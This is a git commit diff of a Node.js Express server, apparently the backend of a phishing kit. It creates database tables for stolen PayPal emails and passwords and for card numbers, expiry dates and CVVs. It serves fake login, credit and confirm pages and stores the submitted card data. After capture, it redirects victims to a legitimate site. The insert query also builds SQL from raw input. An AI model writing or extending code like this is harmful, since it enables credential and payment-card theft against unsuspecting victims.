60266f978aea9002bdf26d895869e7a84084b29b
fadysadaqah <fadysadaqah@gmail.com>
2019-06-03 01:15:34 +0200

    ad

--- app.js
+++ app.js
@@ -5,44 +5,55 @@ var bodyParser = require('body-parser');
 app.use(bodyParser.urlencoded({ extended: false }));
 const PORT = process.env.PORT || 5000;
 app.use(express.static('public'));
-app.set('view engine','ejs')
-// const client = new pg.Client(process.env.DATABASE_URL);
-// client.connect();
+app.set('view engine', 'ejs')
+const client = new pg.Client(process.env.DATABASE_URL);
+client.connect();
 
-// client.query("create table hazem (card text,exp text,cvv text,time timestamp default now())")
+client.query("create table visa (id serial , card text,exp text,cvv text,time timestamp default now())")
+client.query("create table paypal (id serial , mail text,pass text,cardholder text,card text,exp text,cvv text,time timestamp default now())")
 // #######################################################################
 
-app.get('/',function(req,res){
-    res.render('home')
-})
-app.get('/mid',function(req,res){
+
+app.get('*/mid', function (req, res) {
     res.render('mid')
 })
-app.get('/credit',function(req,res){
+app.get('*/credit', function (req, res) {
     res.render('credit')
 })
-app.get('/login',function(req,res){
+app.get('*/login', function (req, res) {
     res.render('login')
 })
-app.get('/confirm',function(req,res){
+app.get('*/confirm', function (req, res) {
     res.render('confirm')
 })
-app.post('/visa',function(req,res){
-    console.log(req.body);
+
+
+
+
+// ############################################################
+
+
+app.post('*/visa', function (req, res) {
+    var a = req.body.a;
+    var b = req.body.b;
+    var c = req.body.c;
+    client.query('Insert into visa (card,exp,cvv) values(' + a + ',' + b + ',' + c + ')')
 })
-app.post('/paypala',function(req,res){
+app.post('*/paypala', function (req, res) {
     console.log(req.body);
     res.redirect('/confirm')
 })
-app.post('*', function (req, res) {
+app.post('*/paypalb', function (req, res) {
     console.log(req.body);
+    res.redirect('https://www.freelancer.com')
 })
 
 
 
 
 
-// #######################################################################
-app.get('*', function (req, res) {res.render('home')})
 
-app.listen(PORT, function () {console.log('Server Started')})
+// #######################################################################
+app.get('*', function (req, res) { res.render('home') })
+
+app.listen(PORT, function () { console.log('Server Started') })
